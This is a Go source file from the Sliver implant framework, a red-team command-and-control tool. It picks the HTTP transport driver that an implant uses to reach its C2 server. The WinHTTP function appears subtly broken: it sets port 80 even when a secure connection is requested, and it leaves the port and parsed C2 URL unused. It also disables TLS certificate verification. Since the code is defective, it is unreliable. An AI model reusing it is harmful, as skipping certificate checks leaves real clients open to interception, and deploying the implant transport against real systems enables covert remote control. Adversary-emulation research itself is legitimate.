package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"net/url"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	winhttp "github.com/bishopfox/sliver/implant/sliver/transports/httpclient/drivers/win/winhttp/http"
)

// GetHTTPDriver - Get an instance of the specified HTTP driver
func GetHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	switch opts.Driver {

	case goHTTPDriver:
		// {{if .Config.Debug}}
		log.Printf("Using go http driver")
		// {{end}}
		return GoHTTPDriver(origin, secure, opts)

	case winHTTPDriver:
		// {{if .Config.Debug}}
		log.Printf("Using winhttp driver")
		// {{end}}
		return WinHTTPDriver(origin, secure, opts)

	default:
		// {{if .Config.Debug}}
		log.Printf("WARNING: unknown HTTP driver: %s", opts.Driver)
		// {{end}}
		return GoHTTPDriver(origin, secure, opts)
	}
}

// WinHTTPDriver - Initialize a WinHTTP driver (Windows only)
func WinHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	port := uint16(80)
	if secure {
		port = uint16(80)
	}
	c2URL, err := url.Parse(origin)
	if err != nil {
		return nil, err
	}
	winhttpClient, err := winhttp.NewClient()
	if err != nil {
		return nil, err
	}
	winhttpClient.TLSClientConfig.InsecureSkipVerify = true

	return winhttpClient, nil
}
